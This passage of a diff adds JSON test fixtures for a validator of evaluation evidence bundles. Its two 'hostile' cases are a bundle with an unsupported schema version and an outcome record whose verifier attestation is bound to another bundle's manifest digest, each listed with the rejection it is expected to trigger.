+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          }
+        ]
+      }
+    },
+    {
+      "fixture_id": "hostile_unsupported_schema_version",
+      "file": "hostile/unsupported-schema-version.json",
+      "category": "hostile",
+      "schema": "schemas/evidence-intake-1.0.0.schema.json",
+      "property_exercised": "The bundle declares a protocol version this validator does not implement.",
+      "expected_rejection": {
+        "code": "unsupported_schema_version",
+        "pointer": "/schema_version",
+        "detail": "evidence-intake/1.0.0"
+      },
+      "expected_rejection_reason": "schema_version is 'evidence-intake/1.1.0', not the pinned 'evidence-intake/1.0.0'; an unsupported version is rejected rather than reinterpreted.",
+      "materialisation": {
+        "archive_root": "bundle/",
+        "jobspec_bytes": "{\"jobspec_format_version\":\"2.4.0\",\"job_id\":\"jb-2026-08-01-0007\",\"repository\":\"agent-workbench/fixture-repo\",\"task_kind\":\"bug_fix\"}",
+        "entries": [
+          {
+            "name": "candidate/ledger.py.diff",
+            "entry_type": "file",
+            "size_bytes": 279,
+            "sha256": "fd350fbddf54545c010c82376c8e39d41e20d46b0709a60f9e6314ad57515b56",
+            "content": "--- a/ledger.py\n+++ b/ledger.py\n@@ -17,6 +17,9 @@ def commit_effect(job_id: str) -> None:\n-    if not already_committed(job_id):\n-        write_effect(job_id)\n+    with effect_lock(job_id):\n+        if already_committed(job_id):\n+            return\n+        write_effect(job_id)\n"
+          },
+          {
+            "name": "evidence/visible-tests-initial.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "6abd6df359875cedb8874ca4502a97144fb918c687f01ad0f0c49d1f0cd03cf6",
+            "content": "{\"suite\":\"visible\",\"exit_code\":1,\"total\":12,\"passed\":10,\"failed\":2,\"errors\":0,\"skipped\":0}"
+          },
+          {
+            "name": "evidence/visible-tests-final.json",
+            "entry_type": "file",
+            "size_bytes": 90,
+            "sha256": "f14a5edc62cf7939265f29628c5f55170a0a8f198204eed118f2ef4631e99708",
+            "content": "{\"suite\":\"visible\",\"exit_code\":0,\"total\":12,\"passed\":12,\"failed\":0,\"errors\":0,\"skipped\":0}"
+          }
+        ]
+      }
+    },
+    {
+      "fixture_id": "hostile_verifier_attestation_mismatch",
+      "file": "hostile/verifier-attestation-mismatch.json",
+      "category": "hostile",
+      "schema": "schemas/evallab-outcome-1.0.0.schema.json",
+      "property_exercised": "An outcome record whose verifier attestation is bound to a different bundle's manifest digest.",
+      "expected_rejection": {
+        "code": "attestation_binding_mismatch",
+        "pointer": "/verifier_attestation/bound_manifest_digest",
+        "detail": null
+      },
+      "expected_rejection_reason": "verifier_attestation.bound_manifest_digest does not equal bundle_manifest_digest; the attestation is not bound to this run's digests, which is a mismatch rather than a pass.",
+      "materialisation": {
+        "bundle_fixture": "valid_single_attempt",
+        "note": "The attestation names a manifest digest for a different bundle. Every other binding in this record is correct, so only the mismatch fires."
+      }
+    }
+  ]
+}
